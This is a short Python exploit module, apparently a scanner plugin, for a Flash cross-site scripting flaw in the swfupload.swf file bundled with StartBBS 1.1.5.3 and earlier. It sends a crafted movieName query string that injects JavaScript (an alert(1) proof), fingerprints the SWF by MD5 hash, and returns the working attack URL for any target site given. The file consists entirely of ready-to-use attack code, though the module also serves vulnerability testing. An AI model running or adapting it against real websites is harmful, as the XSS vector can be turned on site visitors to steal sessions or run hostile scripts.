#!/usr/bin/env python
# -*- coding:utf-8 -*-

import hashlib
from lib import logger
from lib import requests

author = "Chu <root@sh3ll.me>"
scope = "StartBBS -1.1.5.3"
description = "StartBBS swfupload.swf Flash XSS"
reference = "http://www.wooyun.org/bugs/wooyun-2014-049457/trace/bbf81ebe07bcc6021c3438868ae51051"
options = [
    {
        "Name": "URL",
        "Current Setting": "",
        "Required": True,
        "Description": "网站地址"
    }
]


def exploit(URL):
    url = URL + "/plugins/kindeditor/plugins/multiimage/images/swfupload.swf" \
                "?movieName=\"]%29;}catch%28e%29{}if%28!self.a%29self.a=!ale" \
                "rt%281%29;//"
    logger.process("Requesting target site")
    r = requests.get(url, timeout=5)
    r.close()
    if hashlib.md5(r.content).hexdigest() == "3a1c6cc728dddc258091a601f28a9c12":
        logger.success("Exploitable!")
        logger.success(url)
        return url
